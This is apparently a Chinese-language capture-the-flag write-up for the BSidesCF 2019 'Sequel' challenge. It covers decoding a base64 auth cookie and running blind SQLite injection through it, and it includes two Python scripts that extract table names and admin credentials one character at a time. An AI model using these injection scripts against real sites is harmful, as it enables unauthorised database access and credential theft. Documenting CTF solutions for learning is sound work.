---
title: '[BSidesCF 2019]Sequel'
date: 2025-01-05 14:51:06
tags: sqlite注入
categories: 刷题笔记
---

## [BSidesCF 2019]Sequel

题目没给啥信息，我们来爆破账号密码

爆破后得到账号密码都为guest

登录后，会发现在hacker的那一栏提示我们要以admin的角色登陆，所以本题的大致思路应该就是通过普通用户注入出admin的密码，然后登陆。

我们查看cookie

![image-20250105150643940](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202501051506973.png)

1337_AUTH=eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJndWVzdCJ9

嗯，长的非常可疑，我们解码看看

base64解码得到{"username":"guest","password":"guest"}

我们猜测是cookie注入，数据库为SQLite

我们用大佬的脚本

```
import requests
import base64
import string
import sys
out = ""
while True:
    for letter in string.printable:
        tmp = out + letter
        payload = r'{{"username":"\" OR EXISTS(SELECT name FROM sqlite_master WHERE name LIKE \"{}\" limit 1) OR \"","password":"guest"}}'.format(tmp + '%')
        payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
        r = requests.get('http://3fb285db-6d23-44a1-aace-8214aa053f73.node5.buuoj.cn:81/sequels', cookies={"1337_AUTH" : payload})
        if "Movie" in r.text:
            out = tmp
            sys.stdout.write(letter)
            sys.stdout.flush()
            break
```

查询所有表名（必须自己手工多次查询）

拆了列名 username，password进行查询

```python
import requests
import base64
import string
import sys

out = ""

while True:
    for letter in string.printable:
        tmp = out + letter

        if letter == 'g': continue

        payload = r'{{"username":"\" OR EXISTS(SELECT username FROM userinfo WHERE username LIKE \"{}\" limit 1) OR \"","password":"guest"}}'.format(tmp + '%')

        payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')

        r = requests.get('https://sequel-9cba4c8e.challenges.bsidessf.net/sequels', cookies={"1337_AUTH" : payload})
        if "Movie" in r.text:
            out = tmp
            sys.stdout.write(letter)
            sys.stdout.flush()
            break

```

通过这个脚本可以获得用户名和密码，需要多测试几遍

```
sequeladmin
f5ec3af19f0d3679e7d5a148f4ac323d
```

参考

https://cloud.tencent.com/developer/article/1472545
